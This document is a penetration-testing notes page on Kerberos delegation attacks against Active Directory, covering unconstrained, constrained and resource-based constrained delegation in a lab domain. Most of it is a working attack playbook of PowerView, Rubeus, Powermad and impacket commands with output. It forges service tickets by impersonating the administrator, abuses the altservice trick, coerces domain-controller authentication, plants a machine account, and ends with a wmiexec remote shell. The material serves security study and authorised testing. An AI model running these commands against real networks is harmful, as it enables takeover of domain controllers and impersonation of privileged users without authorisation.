## Delegation Attacks

This page highlights three primary attacks against delegation: Unconstrained, Constrained, and Resource-Based Constrained.

### Unconstrained Delegation

Unconstrained delegation lets a service or user act on behalf of another user to access a service. This was introduced to satisfy the need for multiple backend components to communicate. Consider a web application and database. The user interacts with the web application, which needs to interact with the database server. There needed to be a way to allow the web server to "act on behalf of" the user. Thus, delegation was born... With big issues!

When unconstrained delegation is enabled, TGS requests will include the requesting users TGT inside it. The receiving server extracts the TGT, passes it on to the DB to authenticate. However, it also caches the TGT in its kerberos cache. Therefore, if you can compromise an account with unconstrained delegation and force authentication from a target machine, you can extract the TGT from the cache and impersonate those users.

We can use Powerview to find computers with unconstrained delegation available:

 https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1 

```powershell
Get-NetComputer -Unconstrained | select samaccountname
```

You need to compromise the target with unconstrained delegation enabled. Then, using a tool such as Rubeus, start listening for new TGT requests.

```powershell
\Rubeus.exe monitor /targetuser:Neo /interval:60
```

To trigger an authentication request from a domain controller, we can use SpoolSample.exe (In amongst many other techniques - a simple Google will show multiple). This uses the MS-RPRN Print System Remote protocol which handles servers between print clients and servers. It uses the `RpcRemoteFindFirstPrinterChangeNotificationEx()` to send a state change from machine A to machine B. This triggers an authentication request. Using the access to a machine with unconstrained delegation enabvled, this can be caught whilst monitoring for TGT traffic and used to authenticate as the targeted user.

### Constrained Delegation

With the release of constrained delegation, TGT's are no longer cached on the "middleman" machine. Furthermore, the services which can be accessed on behalf of the requesting user are limited. Constrained delegation can be applied to users and computers.

We can find users or computers with it enabled using Powerview and examining the `useraccountcontrol` field. We want to see `TRUSTED_TO_AUTH_FOR_DELEGATION`. The `msds-allowedtodelegateto` field shows which services the computer or user is allowed to delegate to. 

```powershell
Get-NetUser -TrustedToAuth
Get-NetComputer dc04 | select name, msds-allowedtodelegateto, useraccountcontrol
```

If we compromise a server with constrained delegation, we can use it to get code execution on the server instance that it's trusted to delegate to.

We need the password hash of the service account. If we have the cleartext password, we can use rubeus to generate the NTLM hash.

```powershell
PS C:\tools> .\Rubeus.exe hash /password:matrix

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.5.0

[*] Action: Calculate Password Hash(es)
[*] Input password             : matrix
[*]       rc4_hmac             : 4D7A70E2EB3B9F2892D26CDF805C425E
```

Then we can generate a TGT for the service using rubeus.

```powershell
PS C:\tools> .\Rubeus.exe asktgt /user:svc-account /domain:matrix.local /rc4:4D7A70E2EB3B9F2892D26CDF805C425E

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.5.0

[*] Action: Ask TGT

[*] Using rc4_hmac hash: 2892D26CDF84D7A70E2EB3B9F05C425E
[*] Building AS-REQ (w/ preauth) for: 'matrix.local\svc-account'
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIE+jCCBPagAwIBBaEDAgEWooIECzCCBAdhggQDMIID/6ADAgEFoRAbDlBST0QuQ09SUDEuQ09NoiMw...

  ServiceName           :  krbtgt/matrix.local
  ServiceRealm          :  matrix.local
  UserName              :  svc-account
  UserRealm             :  matrix.local
  StartTime             :  9/5/2021 2:29:22 PM
  EndTime               :  9/6/2021 12:29:22 AM
  RenewTill             :  9/12/2021 2:29:22 PM
  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType               :  rc4_hmac
  Base64(key)           :  1FdfaHpiftyOdWn6dHimBQ==
 ```
 
With our TGT, we can now invoke the S4U extensions.

```powershell
PS C:\tools> .\Rubeus.exe s4u /ticket:doIE+jCCBPagAwIBBaEDAgEWooIECzCCBAdhggQDMIID/6ADAgEFoRAbDlBST0QuQ09SUDEuQ09NoiMwIa.../impersonateuser:administrator /msdsspn:MSSQLSvc/sql.matrix.local:1433 /ptt
```

If the output is successful, then we have successfully obtained a useable service ticket for the MSSQL service on sql.matrix.local.

Because this is injected into our cached ticket memory, we can run the MSSQL attacks to confirm it's worked.

```powershell
PS C:\tools> .\SQL.exe
Auth success!
Logged in as: sql.matrix.local\Administrator
Mapped to user: dbo
User is a member of public role
User is a member of sysadmin role
```

In summary, we can access any server that has the msDS-AllowedToDelegateTo property set. If TRUSTED_TO_AUTH_FOR_DELEGATION is set, we can also do this without user interaction.



#### Just this service, sir?

The s4u protocol doesn't validate the service provided in the ticket is real, meaning we can use add the `/altservice:<service>` to the request to request alternative services to the one listed in the `msds-allowedtodelegateto` field. This only works if the port number is NOT specified in the SPN.


```powershell
PS C:\Tools> .\Rubeus.exe s4u /ticket:doIE+jCCBPag... /impersonateuser:administrator msdsspn:MSSQLSvc/sql.matrix.local /altservice:CIFS /ptt
```

With CIFS access, we can target the service system and use psexec to get remote access to the machine, read sensitive files, write data, etc.


### Resource-Based Constrained Delegation

Authenticated users can (by default) add up to 10 computer accounts to a domain. These domains automatically have SPNs set. By doing this, we can abuse any computer that we have the GenericWrite property enabled on to set the `msDS-AllowedToActOnBehalfOfOtherIdentity` property to the SID of the computer we create. We can then use the newly created computer account to execute the s4u2self and s4u2proxy extensions and obtain a valid TGS for the computer we have GenericWrite over.

We can query how many computers we can add using Powerview.

```powershell
Get-DomainObject -Identity prod -Properties ms-DS-MachineAccountQuota
```

With Powermad, we can add a new computer account.
```powershell
New-MachineAccount -MachineAccount myComputer -Password $(Convertto-securestring 'h4x' -AsPlaintext -force)                                                 
[+] Machine account myComputer added
Get-DomainComputer -Identity myComputer  # Check it was created
```

We then convert the SID of the new computer account to binary format.

```powershell
$sid =Get-DomainComputer -Identity myComputer -Properties objectsid | Select -Expand objectsid 
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($sid))"
$SDbytes = New-Object byte[] ($SD.BinaryLength) 
$SD.GetBinaryForm($SDbytes,0)
```

We'll then write to our target computer that we have GenericWrite over.

```powershell
Get-DomainComputer -Identity dc04 | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
```

We'll use Rubeus to obtain the NTLM hash of the computer account we created.

```powershell
.\Rubeus.exe hash /password:h4x 
AA6EAFB522589934A6E5CE92C6438221
```

After that, request an s4u which will also run the `asktgt` module when provided with a username and hash.

```powershell
.\Rubeus.exe s4u /user:myComputer$ /rc4:AA6EAFB522589934A6E5CE92C6438221 /impersonateuser:administrator /msdsspn:CIFS/dc04.matrix.local /ptt 
```

Finally, check your tickets with `klist` and try to access the C$ drive of the target. It should be successful.

```powershell
dir \\matrix.local\c$
```

#### Attacking from Kali

```bash
# Add the computer fakecomputer$
impacket-addcomputer -computer-name 'fakecomputer$' -computer-pass 'Summer2018!' -dc-ip 10.10.10.10 'MATRIX.local/Neo:Passw0rd'

# Perform the rbcd
python3 rbcd.py -f FAKECOMPUTER -t DC04 -dc-ip 10.10.10.10 MATRIX.local\\Neo:Neo:Passw0rd  

# Get a service ticket for the file system of the target machine
impacket-getST -spn cifs/DC04.matrix.local -impersonate administrator -dc-ip 10.10.10.10 matrix.local/FAKECOMPUTER$:'Summer2018!'

# Export the output .ccache file
export KRB5CCNAME=`pwd`/administrator.ccache

# If not already installed (Enter matrix.local when asked for realm)
sudo apt install krb5-user 
# edit /etc/hosts to have all valid IPs resolving to hosts

# Login using the kerberos ticket
proxychains impacket-wmiexec administrator@DC04.matrix.local -k -no-pass
```